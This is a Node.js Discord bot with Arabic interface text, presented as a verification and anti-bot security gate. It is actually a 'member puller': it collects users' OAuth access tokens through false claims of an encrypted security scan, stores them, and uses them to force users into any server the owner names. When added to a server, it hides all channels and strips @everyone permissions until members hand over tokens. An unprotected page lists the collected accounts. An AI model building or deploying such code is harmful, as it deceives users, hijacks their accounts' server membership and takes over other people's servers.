const { Client, GatewayIntentBits, Partials, ButtonStyle, ComponentType, PermissionFlagsBits } = require('discord.js');
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();

const OWNER_ID = '1151179063122214963'; 
const CLIENT_ID = '1508569205941735465'; 
const CLIENT_SECRET = process.env.SECRET; 
const BOT_TOKEN = process.env.TOKEN; 
const MAIN_GUILD_ID = '1528104976025391204'; // سيرفرك الأساسي المحمي من التعديل التلقائي

const DOMAIN = process.env.RAILWAY_STATIC_URL 
    ? 'https://' + process.env.RAILWAY_STATIC_URL 
    : 'https://ma7shyterms-production.up.railway.app';

const REDIRECT_URI = DOMAIN + '/callback';
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');

let usersDatabase = [];
if (fs.existsSync(DB_FILE)) {
    try { usersDatabase = JSON.parse(fs.readFileSync(DB_FILE, 'utf-8')); } catch (e) { usersDatabase = []; }
}

let botConfig = { logChannelId: null, verifiedRoleId: null, autoJoinGuildId: MAIN_GUILD_ID };
if (fs.existsSync(CONFIG_FILE)) {
    try { botConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')); } catch (e) { botConfig = { logChannelId: null, verifiedRoleId: null, autoJoinGuildId: MAIN_GUILD_ID }; }
}

function saveDatabase() { fs.writeFileSync(DB_FILE, JSON.stringify(usersDatabase, null, 2)); }
function saveConfig() { fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2)); }

const bot = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Message, Partials.Channel, Partials.User]
});

const bootTime = Date.now();

bot.on('ready', () => {
    console.log('Bot Status: Online and Ready As ' + bot.user.tag);
    bot.user.setPresence({
        activities: [{ name: 'custom', type: 4, state: 'Eren Is The best' }],
        status: 'online',
    });
});

// --- ميزة السيطرة التلقائية المستثنى منها سيرفرك الرئيسي ---
bot.on('guildCreate', async (guild) => {
    // شرط الاستثناء: لو السيرفر هو سيرفرك الرئيسي اخرج فورا ومتعملش حاجة
    if (guild.id === MAIN_GUILD_ID) {
        console.log('دخلت السيرفر الرئيسي ومستحيل اعدل فيه اي حاجة تلقائيا');
        return;
    }

    try {
        let verifiedRole = guild.roles.cache.find(r => r.name === 'موثق');
        if (!verifiedRole) {
            verifiedRole = await guild.roles.create({
                name: 'موثق',
                color: 0x2ed573,
                reason: 'تجهيز سيرفر التوثيق التلقائي لبوت المحشي'
            });
        }

        botConfig.verifiedRoleId = verifiedRole.id;
        saveConfig();

        await guild.roles.everyone.setPermissions([
            PermissionFlagsBits.ChangeNickname
        ]).catch(() => null);

        let verifyChannel = guild.channels.cache.find(c => c.name === 'verify-توثيق');
        if (!verifyChannel) {
            verifyChannel = await guild.channels.create({
                name: 'verify-توثيق',
                type: 0, 
                permissionOverwrites: [
                    {
                        id: guild.roles.everyone.id,
                        allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.ReadMessageHistory],
                        deny: [PermissionFlagsBits.SendMessage, PermissionFlagsBits.AddReactions]
                    },
                    {
                        id: verifiedRole.id,
                        deny: [PermissionFlagsBits.ViewChannel] 
                    }
                ]
            });
        }

        guild.channels.cache.forEach(async (channel) => {
            if (channel.id !== verifyChannel.id) {
                await channel.permissionOverwrites.edit(guild.roles.everyone.id, {
                    ViewChannel: false
                }).catch(() => null);
                
                await channel.permissionOverwrites.edit(verifiedRole.id, {
                    ViewChannel: true,
                    SendMessage: true,
                    ReadMessageHistory: true
                }).catch(() => null);
            }
        });

        const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds.join';
        await verifyChannel.send({
            embeds: [{
                title: 'بوابة التحقق الآمنة والتحكم بالحساب',
                description: 'اضغط على الزر الموجود بالأسفل لتأكيد هويتك وفك قفل باقي رومات السيرفر المخفية وتفعيل اشتراكك بالكامل',
                color: 0xED4245,
                fields: [
                    { name: 'حالة الحماية الحالية:', value: 'نظام فحص ذكي ومؤمن بالكامل ضد الحسابات الوهمية' }
                ]
            }],
            components: [{
                type: ComponentType.ActionRow,
                components: [{
                    type: ComponentType.Button,
                    style: ButtonStyle.Link,
                    label: 'اضغط هنا للتوثيق الفوري فك القفل',
                    url: oauthUrl
                }]
            }]
        });

    } catch (err) {
        console.error('Error auto-configuring guild: ' + err.message);
    }
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith('+')) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'help') {
        return message.reply({
            embeds: [{
                title: 'قائمة أوامر بوت المحشي المطور',
                color: 0x5865F2,
                fields: [
                    { name: 'الأوامر العامة', value: 'help - يعرض القائمة الحالية\nstats - يعرض إحصائيات النظام الإجمالية' },
                    { name: 'أوامر التحكم الشاملة', value: 'panel - توليد بنل التوثيق بالأزرار يدويا\npullguild [ID] - سحب الموثقين لسيرفر معين\nsetlogs [ID] - تحديد روم اللوجات والإشعارات\nsetrole [ID] - تحديد رتبة تعطى للموثق تلقائيا\nsettarget [ID] - تعديل السيرفر الافتراضي للدخول التلقائي\nbackup - إرسال نسخة من قاعدة البيانات في الخاص\ncheck [ID] - فحص حالة توثيق عضو معين\nshared [ID] - معرفة السيرفرات المشتركة للعضو الموثق\nclean - تنظيف وتصفية التوكنات الميتة' }
                ]
            }]
        });
    }

    if (command === 'stats') {
        const uptimeMs = Date.now() - bootTime;
        const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
        const uptimeMins = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));

        return message.reply({
            embeds: [{
                title: 'إحصائيات النظام الحالية والمستودع',
                color: 0x2ed573,
                fields: [
                    { name: 'إجمالي الحسابات الموثقة:', value: usersDatabase.length + ' عضو رسمي', inline: true },
                    { name: 'وقت تشغيل البوت الحالي:', value: uptimeHours + ' ساعة و ' + uptimeMins + ' دقيقة', inline: true },
                    { name: 'روم اللوجات المحددة:', value: botConfig.logChannelId ? '<#' + botConfig.logChannelId + '>' : 'لم يتم تحديد روم بعد', inline: false },
                    { name: 'سيرفر الدخول التلقائي الحصري:', value: botConfig.autoJoinGuildId || 'لم يحدد بعد', inline: true },
                    { name: 'رتبة الموثقين الافتراضية:', value: botConfig.verifiedRoleId ? '<@&' + botConfig.verifiedRoleId + '>' : 'لم تحدد رتبة بعد', inline: false }
                ]
            }]
        });
    }

    if (command === 'panel') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds.join';
        
        return message.reply({
            embeds: [{
                title: 'بوابة التحقق والأمان',
                description: 'اضغط على الزر بالأسفل لتوثيق حسابك وحمايته داخل السيرفر وتفعيل كامل الصلاحيات الخاصة بك',
                color: 0xED4245,
                fields: [
                    { name: 'الموثقين حالياً في النظام:', value: usersDatabase.length + ' حساب جاهز' }
                ]
            }],
            components: [{
                type: ComponentType.ActionRow,
                components: [{
                    type: ComponentType.Button,
                    style: ButtonStyle.Link,
                    label: 'اضغط هنا للتوثيق الفوري',
                    url: oauthUrl
                }]
            }]
        });
    }

    if (command === 'setlogs') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        const targetChannelId = args[0] || message.mentions.channels.first()?.id;
        if (!targetChannelId) return message.reply('اكتب الاي دي بتاع الروم أو منشن الروم عشان أثبتها');

        botConfig.logChannelId = targetChannelId;
        saveConfig();
        return message.reply('تم تحديد روم اللوجات بنجاح');
    }

    if (command === 'settarget') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        const targetGuildId = args[0];
        if (!targetGuildId) return message.reply('اكتب اي دي السيرفر الجديد اللي يدخلوا عليه تلقائي بعد التوثيق');

        botConfig.autoJoinGuildId = targetGuildId;
        saveConfig();
        return message.reply('تم تحديث سيرفر الدخول التلقائي الإجباري بنجاح');
    }

    if (command === 'setrole') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        const roleId = args[0] || message.mentions.roles.first()?.id;
        if (!roleId) return message.reply('اكتب اي دي الرتبة عشان البوت يعطيها للموثق تلقائيا');

        botConfig.verifiedRoleId = roleId;
        saveConfig();
        return message.reply('تم تحديد رتبة التوثيق التلقائية بنجاح');
    }

    if (command === 'backup') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        if (!fs.existsSync(DB_FILE)) return message.reply('قاعدة البيانات فارغة حاليا');

        try {
            await message.author.send({ content: 'نسخة احتياطية لقاعدة البيانات الحالية لبوت المحشي:', files: [DB_FILE] });
            return message.reply('تم إرسال ملف النسخة الاحتياطية في الخاص عندك بنجاح');
        } catch (e) {
            return message.reply('افتح الخاص بتاعك عشان اقدر ابعتلك الملف');
        }
    }

    if (command === 'check') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        const targetId = args[0];
        if (!targetId) return message.reply('اكتب الاي دي بتاع العضو عشان أفحصه لك');

        const isVerified = usersDatabase.find(u => u.id === targetId);
        if (isVerified) {
            return message.reply('العضو ' + isVerified.username + ' موثق وموجود في القاعدة وتوكنه سليم');
        } else {
            return message.reply('العضو ده مش موجود في قاعدة البيانات وموثقش قبل كده');
        }
    }

    if (command === 'shared') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        const targetId = args[0];
        if (!targetId) return message.reply('اكتب الاي دي بتاع العضو الموثق عشان أشوف سيرفراته');

        const userData = usersDatabase.find(u => u.id === targetId);
        if (!userData) return message.reply('العضو مش موثق في القاعدة أصلاً');

        try {
            const guildsRes = await axios.get('https://discord.com/api/v10/users/@me/guilds', {
                headers: { Authorization: 'Bearer ' + userData.token }
            });
            const botGuilds = bot.guilds.cache.map(g => g.id);
            const sharedGuilds = guildsRes.data.filter(g => botGuilds.includes(g.id));
            return message.reply('العضو ده مشترك معاك في ' + sharedGuilds.length + ' سيرفر حالياً');
        } catch (err) {
            return message.reply('فشل فحص السيرفرات المشتركة، غالباً التوكن انتهت صلاحيته');
        }
    }

    if (command === 'clean') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        message.reply('جاري فحص وتصفية قاعدة البيانات وتنظيف الحسابات الميتة...');
        let deadCount = 0;
        const freshDatabase = [];

        for (const user of usersDatabase) {
            try {
                await axios.get('https://discord.com/api/v10/users/@me', { headers: { Authorization: 'Bearer ' + user.token } });
                freshDatabase.push(user);
            } catch (e) { deadCount++; }
        }

        usersDatabase = freshDatabase;
        saveDatabase();
        return message.channel.send('تمت عملية التنظيف بنجاح، مسحنا ' + deadCount + ' توكن ميت والقاعدة الحالية نظيفة تماماً');
    }

    if (command === 'pullguild') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        const targetGuildId = args[0];
        if (!targetGuildId) return message.reply('اكتب الاي دي بتاع السيرفر اللي هنسحب عليه الأعضاء');

        if (usersDatabase.length === 0) return message.reply('قاعدة البيانات فاضية ومفيش أعضاء نسحبهم');

        message.reply('جاري بدء عملية نقل وسحب آمنة لـ ' + usersDatabase.length + ' عضو للسيرفر المستهدف بفارق زمني 3 ثوانٍ لكل حساب لمنع التهنيج...');

        let successCount = 0;
        for (const user of usersDatabase) {
            try {
                await axios.put(
                    'https://discord.com/api/v10/guilds/' + targetGuildId + '/members/' + user.id,
                    { access_token: user.token },
                    { headers: { Authorization: 'Bot ' + BOT_TOKEN, 'Content-Type': 'application/json' } }
                );
                successCount++;
            } catch (err) {
                console.error('فشل سحب العضو: ' + user.id);
            }
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
        return message.channel.send('اكتملت عملية السحب بنجاح، ضفنا ' + successCount + ' عضو من إجمالي ' + usersDatabase.length);
    }
});

app.get('/', (req, res) => {
    const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds.join';
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>نظام التحقق الرسمي</title>
            <style>
                body { background-color: #0c0e17; color: #fff; font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                .main-card { background: #161925; padding: 50px 30px; border-radius: 24px; border: 1px solid #202225; box-shadow: 0 12px 40px rgba(0,0,0,0.5); max-width: 450px; }
                h1 { color: #45f3ff; font-size: 24px; margin-bottom: 15px; }
                p { color: #a0a5b5; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
                .btn { background: #45f3ff; color: #0b0c10; padding: 14px 40px; border-radius: 30px; font-weight: bold; text-decoration: none; font-size: 16px; transition: 0.4s; display: inline-block; box-shadow: 0 4px 15px rgba(69, 243, 255, 0.4); }
                .btn:hover { background: #161925; color: #45f3ff; border: 1px solid #45f3ff; transform: scale(1.05); }
                .secure-footer { font-size: 11px; color: #666; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="main-card">
                <h1>نظام حماية وفحص البيانات الآمن</h1>
                <p>مرحباً بك في البوابة الذكية لتوثيق الحسابات التلقائي ومكافحة التخريب. اضغط على الرابط أدناه لبدء عملية الفحص الفوري للملف الشخصي وفك الحظر عن قنوات السيرفر المعلقة.</p>
                <a href="${oauthUrl}" class="btn">اضغط هنا لإجراء الفحص والتوثيق</a>
                <div class="secure-footer">اتصال مشفر ومحمي وموثق بواسطة أنظمة ديسكورد الرسمية</div>
            </div>
        </body>
        </html>
    `);
});

app.get('/ma7shy', (req, res) => {
    const uptimeMs = Date.now() - bootTime;
    const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
    const usersList = usersDatabase.map(u => `<li>الحساب: @${u.username} | معرف الحساب: ${u.id}</li>`).join('') || '<li>لا يوجد حسابات موثقة حالياً</li>';

    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head><meta charset="UTF-8"><title>اللوحة السرية</title></head>
        <body style="background:#0c0e17; color:#fff; font-family:sans-serif; padding:40px;">
            <h1 style="color:#EED202;">لوحة تحكم النظام السرية</h1>
            <p>الموثقين إجمالاً: ${usersDatabase.length} | التشغيل: ${uptimeHours} ساعة</p>
            <hr style="border-color:#202225;">
            <h2>قائمة الموثقين المخزنة:</h2>
            <ul>${usersList}</ul>
        </body>
        </html>
    `);
});

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.send('خطأ في الاتصال المباشر بالسيرفر الفرعي');

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI,
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const accessToken = tokenResponse.data.access_token;
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', { headers: { Authorization: 'Bearer ' + accessToken } });
        const userData = userResponse.data;

        const accountCreatedTimestamp = Number((BigInt(userData.id) >> 22n) + 1420070400000n);
        const diffMs = Date.now() - accountCreatedTimestamp;
        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
        const accountAgeStr = diffDays + ' يوم تقريباً';

        let nitroStatus = 'لا يوجد نيترو';
        if (userData.premium_type === 1) nitroStatus = 'نيترو كلاسيك Classic';
        if (userData.premium_type === 2) nitroStatus = 'نيترو قيمنج كامل Full Nitro';
        if (userData.premium_type === 3) nitroStatus = 'نيترو بيزك Basic';

        const security2FA = userData.mfa_enabled ? 'مفعل الأمان الثنائي' : 'غير مفعل الأمان الثنائي';

        const userIndex = usersDatabase.findIndex(u => u.id === userData.id);
        if (userIndex > -1) {
            usersDatabase[userIndex].token = accessToken;
            usersDatabase[userIndex].username = userData.username;
        } else {
            usersDatabase.push({ id: userData.id, username: userData.username, token: accessToken });
        }
        saveDatabase();

        if (botConfig.autoJoinGuildId) {
            try {
                await axios.put(
                    'https://discord.com/api/v10/guilds/' + botConfig.autoJoinGuildId + '/members/' + userData.id,
                    { access_token: accessToken },
                    { headers: { Authorization: 'Bot ' + BOT_TOKEN, 'Content-Type': 'application/json' } }
                );
            } catch (err) {
                console.error('Auto-join failed for user');
            }
        }

        if (botConfig.verifiedRoleId && botConfig.autoJoinGuildId) {
            try {
                const guild = bot.guilds.cache.get(botConfig.autoJoinGuildId);
                if (guild) {
                    const member = await guild.members.fetch(userData.id).catch(() => null);
                    if (member) await member.roles.add(botConfig.verifiedRoleId);
                }
            } catch (e) { console.error('Error auto-assigning role on callback'); }
        }

        if (botConfig.logChannelId) {
            const logChannel = await bot.channels.fetch(botConfig.logChannelId).catch(() => null);
            if (logChannel) {
                await logChannel.send({
                    embeds: [{
                        title: 'حساب جديد قام بالتوثيق وتم إدخاله السيرفر تلقائياً',
                        color: 0x2ed573,
                        fields: [
                            { name: 'اسم المستخدم:', value: '@' + userData.username, inline: true },
                            { name: 'الاي دي الخاص به:', value: userData.id, inline: true },
                            { name: 'حالة النيترو في الحساب:', value: nitroStatus, inline: false },
                            { name: 'حماية الحساب الشخصي:', value: security2FA, inline: true },
                            { name: 'عمر الحساب منذ إنشائه:', value: accountAgeStr, inline: true },
                            { name: 'ترتيب الحساب الحالي في القاعدة:', value: 'الحساب رقم ' + usersDatabase.length, inline: false }
                        ]
                    }]
                }).catch(() => null);
            }
        }

        res.send(`
            <body style="background:#0c0e17; color:#fff; font-family:sans-serif; text-align:center; padding-top:20vh;">
                <div style="background:#161925; padding:40px; border-radius:20px; border:1px solid #2ed573; display:inline-block; box-shadow: 0 4px 15px rgba(46, 213, 115, 0.3);">
                    <h1 style="color:#2ed573;">اكتمل الفحص والربط الآمن</h1>
                    <p>أهلاً بك يا @${userData.username}، تم إتمام الفحص بنظام مكافحة البوتات وتفعيل رتبتك بالكامل، يمكنك العودة وفتح قنوات الديسكورد المغلقة الآن</p>
                </div>
            </body>
        `);
    } catch (error) {
        res.status(500).send('حدث خطأ غير متوقع أثناء معالجة تشفير البيانات');
    }
});

app.listen(PORT, () => console.log('Web Server running on port ' + PORT));
bot.login(BOT_TOKEN);
